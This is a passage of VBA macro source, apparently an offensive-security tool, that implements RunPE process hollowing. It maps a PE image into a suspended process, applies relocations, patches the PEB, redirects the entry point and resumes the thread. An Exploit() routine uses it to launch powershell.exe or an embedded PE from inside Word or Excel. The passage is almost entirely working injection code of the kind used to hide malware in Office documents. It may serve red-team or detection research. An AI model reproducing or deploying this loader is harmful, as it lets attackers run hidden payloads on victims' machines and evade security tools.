            Debug.Print ("    |__ VirtualAllocEx() OK - Got Addr: 0x" + Hex(ptrProcessImageBase))
        End If
    End If
    
    
    ' Change the image base saved in headers
    ' |__ IMAGE_NT_HEADERS is at offset: 0 + IMAGE_DOS_HEADER.e_lfanew
    ' |__ IMAGE_NT_HEADERS = Signature || IMAGE_FILE_HEADER || IMAGE_OPTIONAL_HEADER
    ' |__ In IMAGE_OPTIONAL_HEADER32, ImageBase is at offset 28
    ' |__ => ImageBase is at offset: 0 + IMAGE_DOS_HEADER.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 28
    ' |__ In IMAGE_OPTIONAL_HEADER64, ImageBase is at offset 24
    ' |__ => ImageBase is at offset: 0 + IMAGE_DOS_HEADER.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 24
    If ptrProcessImageBase <> structNTHeaders.OptionalHeader.ImageBase Then
        Dim lImageBaseAddrOffset As Long
        Dim ptrImageBase As LongPtr
        #If Win64 Then
            lImageBaseAddrOffset = 0 + structDOSHeader.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 24
        #Else
            lImageBaseAddrOffset = 0 + structDOSHeader.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 28
        #End If

        'Call RtlMoveMemory(VarPtr(ptrImageBase), VarPtr(baImage(0 + lImageBaseAddrOffset)), SIZEOF_ADDRESS) ' Read current value
        'Debug.Print ("Current image base: 0x" + Hex(ptrImageBase) + " - Image base to write: 0x" + Hex(ptrProcessImageBase))
        
        Call RtlMoveMemory(VarPtr(baImage(0 + lImageBaseAddrOffset)), VarPtr(ptrProcessImageBase), SIZEOF_ADDRESS) ' Write new value
        
        'Call RtlMoveMemory(VarPtr(ptrImageBase), VarPtr(baImage(0 + lImageBaseAddrOffset)), SIZEOF_ADDRESS) ' Read current value to verify
        'Debug.Print ("New effective image base: 0x" + Hex(ptrImageBase))
    End If


    ' Allocate some memory in the current process to store the source image
    Debug.Print ("[*] Allocating memory for the source image in current process...")
    Dim ptrImageLocalCopy As LongPtr
    ptrImageLocalCopy = VirtualAlloc(0&, structNTHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    If ptrImageLocalCopy = 0 Then
        Debug.Print ("    |__ VirtualAlloc() failed (Err:" + Str(Err.LastDllError) + ").")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ VirtualAlloc() OK - Got Addr: 0x" + Hex(ptrImageLocalCopy))
        End If
    End If
    
    
    ' Copy source image to local memory
    Debug.Print ("[*] Writing source image in current process...")
    If VERBOSE Then
        Debug.Print ("    |__ Target address: 0x" + Hex(ptrImageLocalCopy))

        Debug.Print ("[*] Writing PE headers...")
        Debug.Print ("    |__ Headers size:" + Str(structNTHeaders.OptionalHeader.SizeOfHeaders))
    End If
    Call RtlMoveMemory(ptrImageLocalCopy, VarPtr(baImage(0)), structNTHeaders.OptionalHeader.SizeOfHeaders)
    
    If VERBOSE Then
        Debug.Print ("[*] Writing PE sections...")
    End If
    Dim iCount As Integer
    Dim structSectionHeader As IMAGE_SECTION_HEADER
    For iCount = 0 To (structNTHeaders.FileHeader.NumberOfSections - 1)
        ' Nth section is at offset:
        '  0 (image base)
        '  + DOSHeader->e_lfanew  Image base address
        '  + 248 OR 264           IMAGE_NT_HEADERS size is 248 (32 bits) or 264 (64 bits)
        '  + N * 40               IMAGE_SECTION_HEADER is 40 (32 & 64 bits)
        Call RtlMoveMemory(VarPtr(structSectionHeader), VarPtr(baImage(structDOSHeader.e_lfanew + SIZEOF_IMAGE_NT_HEADERS + (iCount * SIZEOF_IMAGE_SECTION_HEADER))), SIZEOF_IMAGE_SECTION_HEADER)
        
        Dim strSectionName As String: strSectionName = ByteArrayToString(structSectionHeader.SecName)
        Dim ptrNewAddress As LongPtr: ptrNewAddress = ptrImageLocalCopy + structSectionHeader.VirtualAddress
        Dim lSize As Long: lSize = structSectionHeader.SizeOfRawData
        
        If VERBOSE Then
            Debug.Print ("    |__ Writing section: '" + strSectionName + "' (Size:" + Str(lSize) + ") at 0x" + Hex(ptrNewAddress))
        End If

        Call RtlMoveMemory(ptrNewAddress, VarPtr(baImage(0 + structSectionHeader.PointerToRawData)), lSize)
    Next iCount
    

    ' If the base address of the payload changed, we need to apply relocations
    Debug.Print ("[*] Applying relocations...")
    If ptrProcessImageBase <> structNTHeaders.OptionalHeader.ImageBase Then
        
        Dim lMaxSize As Long: lMaxSize = structRelocDirectory.Size
        Dim lRelocAddr As Long: lRelocAddr = structRelocDirectory.VirtualAddress
        
        Dim structReloc As IMAGE_BASE_RELOCATION
        Dim lParsedSize As Long: lParsedSize = 0
        
        Do While lParsedSize < lMaxSize
        
            Dim ptrStructReloc As LongPtr: ptrStructReloc = ptrImageLocalCopy + lRelocAddr + lParsedSize
            Call RtlMoveMemory(VarPtr(structReloc), ptrStructReloc, SIZEOF_IMAGE_BASE_RELOCATION)
            lParsedSize = lParsedSize + structReloc.SizeOfBlock
            
            If (structReloc.VirtualAddress <> 0) And (structReloc.SizeOfBlock <> 0) Then
                If VERBOSE Then
                    Debug.Print ("    |__ Relocation Block: Addr=0x" + Hex(structReloc.VirtualAddress) + " - Size:" + Str(structReloc.SizeOfBlock))
                End If
                
                Dim lEntriesNum As Long: lEntriesNum = (structReloc.SizeOfBlock - SIZEOF_IMAGE_BASE_RELOCATION) / SIZEOF_IMAGE_BASE_RELOCATION_ENTRY
                Dim lPage As Long: lPage = structReloc.VirtualAddress
                
                Dim ptrBlock As LongPtr: ptrBlock = ptrStructReloc + SIZEOF_IMAGE_BASE_RELOCATION
                Dim iBlock As Integer
                Call RtlMoveMemory(VarPtr(iBlock), ptrBlock, SIZEOF_IMAGE_BASE_RELOCATION_ENTRY)
                
                iCount = 0
                For iCount = 0 To (lEntriesNum - 1)
                    Dim iBlockType As Integer: iBlockType = ((iBlock And &HF000) / &H1000) And &HF ' type = value >> 12
                    Dim iBlockOffset As Integer: iBlockOffset = iBlock And &HFFF ' offset = value & 0xfff
                    'Debug.Print ("    |   |__ Block: Type=" + Str(iBlockType) + " - Offset=0x" + Hex(iBlockOffset))
                    
                    If iBlockType = 0 Then
                        Exit For
                    End If

                    Dim iPtrSize As Integer: iPtrSize = 0
                    If iBlockType = &H3 Then ' 32 bits address
                        iPtrSize = 4
                    ElseIf iBlockType = &HA Then ' 64 bits address
                        iPtrSize = 8
                    End If
                    
                    Dim ptrRelocateAddr As LongPtr
                    ptrRelocateAddr = ptrImageLocalCopy + lPage + iBlockOffset

                    If iPtrSize <> 0 Then
                        Dim ptrRelocate As LongPtr
                        Call RtlMoveMemory(VarPtr(ptrRelocate), ptrRelocateAddr, iPtrSize)
                        ptrRelocate = ptrRelocate - structNTHeaders.OptionalHeader.ImageBase + ptrProcessImageBase
                        Call RtlMoveMemory(ptrRelocateAddr, VarPtr(ptrRelocate), iPtrSize)
                    End If
                    
                    ptrBlock = ptrBlock + SIZEOF_IMAGE_BASE_RELOCATION_ENTRY
                    Call RtlMoveMemory(VarPtr(iBlock), ptrBlock, SIZEOF_IMAGE_BASE_RELOCATION_ENTRY)
                    
                Next iCount
            End If
        Loop
    End If
    
    
    ' Write modified image to target process memory
    Debug.Print ("[*] Writing modified source image to target process memory...")
    Dim lWriteProcessMemory As Long
    lWriteProcessMemory = WriteProcessMemory(structProcessInformation.hProcess, ptrProcessImageBase, ptrImageLocalCopy, structNTHeaders.OptionalHeader.SizeOfImage, 0&)
    If lWriteProcessMemory = 0 Then
        Debug.Print ("    |__ WriteProcessMemory() failed (Err:" + Str(Err.LastDllError) + ")")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ WriteProcessMemory() OK")
        End If
    End If
    
    
    ' Free local memory
    Call VirtualFree(ptrImageLocalCopy, structNTHeaders.OptionalHeader.SizeOfImage, &H10000) ' &H10000 = MEM_FREE
    
    
    ' Applying new image base address to target PEB
    Debug.Print ("[*] Applying new image base address to target PEB...")
    Dim ptrPEBImageBaseAddr As LongPtr
    #If Win64 Then
        ptrPEBImageBaseAddr = structContext.Rdx + 16
    #Else
        ptrPEBImageBaseAddr = structContext.Ebx + 8
    #End If
    
    If VERBOSE Then
        Debug.Print ("    |__ Image base address location: 0x" + Hex(ptrPEBImageBaseAddr))
        Debug.Print ("    |__ Image base address: 0x" + Hex(ptrProcessImageBase))
    End If
    
    lWriteProcessMemory = WriteProcessMemory(structProcessInformation.hProcess, ptrPEBImageBaseAddr, VarPtr(ptrProcessImageBase), SIZEOF_ADDRESS, 0&)
    If lWriteProcessMemory = 0 Then
        Debug.Print ("    |__ WriteProcessMemory() failed (Err:" + Str(Err.LastDllError) + ")")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ WriteProcessMemory() OK")
        End If
    End If
    
    
    ' Overwrite context with new entry point
    Debug.Print ("[*] Overwriting context with new entry point...")
    Dim ptrEntryPoint As LongPtr: ptrEntryPoint = ptrProcessImageBase + structNTHeaders.OptionalHeader.AddressOfEntryPoint
    #If Win64 Then
        structContext.Rcx = ptrEntryPoint
    #Else
        structContext.Eax = ptrEntryPoint
    #End If
    
    If VERBOSE Then
        Debug.Print ("    |__ New entry point: 0x" + Hex(ptrEntryPoint))
    End If
    
    Dim lSetThreadContext As Long
    #If Win64 Then
        Call RtlMoveMemory(VarPtr(baContext(0)), VarPtr(structContext), LenB(structContext))
        lSetThreadContext = SetThreadContext(structProcessInformation.hThread, VarPtr(baContext(0)))
    #Else
        lSetThreadContext = SetThreadContext(structProcessInformation.hThread, structContext)
    #End If
    If lSetThreadContext = 0 Then
        Debug.Print ("    |__ SetThreadContext() failed (Err:" + Str(Err.LastDllError) + ")")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        If VERBOSE Then
            Debug.Print ("    |__ SetThreadContext() OK")
        End If
    End If
    
    
    ' Resume thread
    ' |__ If ResumeThread succeeds, the return value is the thread's previous suspend count (i.e. 1 in this case)
    Debug.Print ("[*] Resuming suspended process...")
    Dim lResumeThread As Long
    lResumeThread = ResumeThread(structProcessInformation.hThread)
    If lResumeThread = 1 Then
        If VERBOSE Then
            Debug.Print ("    |__ ResumeThread() OK")
        End If
    Else
        Debug.Print ("    |__ ResumeThread() failed (Err:" + Str(Err.LastDllError) + ")")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    End If

    Debug.Print ("[+] RunPE complete!!!")
    
End Sub

' --------------------------------------------------------------------------------
' Method:    Exploit
' Desc:      Calls FileToByteArray to get the content of a PE file as a Byte
'               array and calls the RunPE procedure to execute it from the memory
'               of Word / Excel
' Arguments: N/A
' Returns:   N/A
' --------------------------------------------------------------------------------
Public Sub Exploit()

    Debug.Print ("================================================================================")
    
    Dim strSrcFile As String
    Dim baSrcFileContent() As Byte
    Dim strSrcArguments As String
    Dim strSrcPE As String
    
    'strSrcFile = "C:\Windows\System32\cmd.exe"
    strSrcFile = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    
    'strSrcFile = "C:\Windows\SysWOW64\cmd.exe"
    'strSrcFile = "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
    
    strSrcArguments = ""
    'strSrcArguments = "-exec Bypass"
    
    strSrcPE = PE()
    If strSrcPE = "" Then
        If Dir(strSrcFile) = "" Then
            Debug.Print ("[-] '" + strSrcFile + "' doesn't exist.")
            Exit Sub
        Else
            Debug.Print ("[*] Source file: '" + strSrcFile + "'")
            If VERBOSE Then
                Debug.Print ("    |__ Command line: " + strSrcFile + " " + strSrcArguments)
            End If
        End If
        baSrcFileContent = FileToByteArray(strSrcFile)
        Call RunPE(baSrcFileContent, strSrcArguments)
    Else
        Debug.Print ("[+] Source file: embedded PE")
        baSrcFileContent = StringToByteArray(strSrcPE)
        Call RunPE(baSrcFileContent, strSrcArguments)
    End If

End Sub
